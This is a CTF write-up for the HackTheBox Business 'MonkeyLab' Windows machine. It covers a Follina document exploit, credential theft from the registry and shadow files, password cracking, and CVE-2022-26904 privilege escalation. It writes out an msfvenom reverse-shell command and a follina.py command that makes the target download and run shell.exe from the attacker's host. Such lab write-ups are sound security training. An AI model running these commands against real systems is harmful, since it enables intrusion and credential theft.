---
layout: posts
title: "HTB Business - MonkeyLab"
tags: writeup, hackthebox, ctf
---

This is an "easy" machine from [HackTheBox Business CTF](https://www.hackthebox.com/events/htb-business-ctf-2022).

Enumeration:

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/1.png)
{: refdef}

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/2.png)
{: refdef}

<p style='text-align: justify;'>
So looking at the port 8080 we can see a page that is looking for documents to scan. This gave us a first impression that the windows machine could be vulnerable to a recent vulnerability named follina. We are going to use the following script to get a foothold: https://github.com/chvancooten/follina.py
<br>
Clone the repo, go inside it, create a reverse shell and place it under the www directory within the script folder:
<br>
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.83 lport=445 -f exe -o shell.exe
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/3.png)
{: refdef}

<p style='text-align: justify;'>
Ignore the other binaries, they are there because of enumeration inside the machine.
<br>
Set up a listener on port 445 and execute the following command on the script root folder:
<br>
python follina.py -t docx -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c mkdir C:\temp && curl http://10.10.14.83:8080/shell.exe -o C:\temp\shell.exe && C:\temp\shell.exe'" -u 10.10.14.83 -P 8080
<br>
This script will create a docx document that we are going to upload to the service listening on port 8080:
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/4.png)
{: refdef}

<p style='text-align: justify;'>
After a minute or two we get a callback to our server running on port 8080 to retrieve the shell executable and a few seconds later we get the callback on our listener on port 445:
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/5.png)
{: refdef}

<p style='text-align: justify;'>
So after enumerating for a while and running winPeas.exe i found two interesting things. First we got the credentials for the current user (they are at the AutoLogon registry):
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/6.png)
{: refdef}

<p style='text-align: justify;'>
Next, i discover that the current user has wsl.exe installed on their session. Veryfing his privileges, we can see that he can use every command as sudo:
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/7.png)
{: refdef}

Knowing this, we can extract shadow and passwd files:

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/8.png)
{: refdef}

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/9.png)
{: refdef}

<p style='text-align: justify;'>
We crack the files using unshadow (to create the john hash) and john. We obtain the following credentials:
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/10.png)
{: refdef}

<p style='text-align: justify;'>
You can verify that the credentials are valid (on the windows machine) using a lot of techiniques but since i wanted to see what the user could access, i used runasCS.exe to get a shell as the Infinity user:
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/11.png)
{: refdef}

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/12.png)
{: refdef}

<p style='text-align: justify;'>
Since we have two valid users, we can use CVE-2022-26904 to escalate privileges. Metasploit has a module to explore this. You need credentials of one user (Infinity) and a meterpreter session from another user (Anomaly):
</p>

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/13.png)
{: refdef}

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/14.png)
{: refdef}

We are now ready to use the msfconsole module:

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/15.png)
{: refdef}

{:refdef: style="text-align: center;"}
![rustscan](/assets/ctfs/htb_dirty_money/monkeylab/16.png)
{: refdef}

